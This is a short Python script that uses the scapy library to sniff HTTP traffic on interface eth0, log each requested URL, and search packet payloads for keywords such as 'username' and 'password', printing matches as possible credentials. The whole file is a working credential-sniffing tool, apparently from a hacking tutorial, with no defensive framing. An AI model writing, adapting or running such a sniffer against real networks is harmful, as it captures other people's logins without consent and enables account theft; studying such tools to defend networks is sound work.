import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface = interface, store = False, prn = process_sniffed_packed) #we can set filter = "udp" or "port 21"

def get_url(packet):
    return str(packet[http.HTTPRequest].Host) + str(packet[http.HTTPRequest].Path)

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        keywords = ["username", "user", "login", "password", "pass"]
        for keyword in keywords:
            if keyword in load:
                return load

def process_sniffed_packed(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> " + url)

        login_info = get_login_info(packet)
        if login_info:
            print(
                "[+] Possible USERNAME and PASSWORD\n-----------------------\n" + login_info + "\n------------------------------")


sniff("eth0")